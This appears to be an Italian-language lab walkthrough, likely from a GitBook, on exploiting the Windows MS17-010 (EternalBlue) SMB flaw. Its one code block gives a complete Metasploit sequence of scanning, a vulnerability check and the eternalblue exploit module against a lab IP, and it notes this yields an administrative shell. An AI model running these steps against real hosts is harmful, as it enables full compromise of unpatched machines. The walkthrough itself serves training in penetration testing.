# Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)



<figure><img src="../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

## Exploit automatico di EternalBlue con MSF

```
service postgresql start
msfconsole
workspace -a EternalBlue
db_nmap -sS -sV -O 10.10.10.7
services
// Controlliamo se è vulnerabile a EternalBlue
search type:auxiliary EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.7
run
// Effettuiamo l'exploit vero e proprio
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.7 //target IP
exploit
```

<figure><img src="../../../.gitbook/assets/image (1062).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1063).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1064).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1065).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../../.gitbook/assets/image (1066).png" alt=""><figcaption></figcaption></figure>

Automaticamente imposta la shell x64 e per noi va bene.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Questo exploit in particolare è molto potente perché con un solo passaggio (l'uso di un solo modulo metasploit) abbiamo accesso con credenziali amministrative. Quindi non dobbiamo fare privilege escalation.
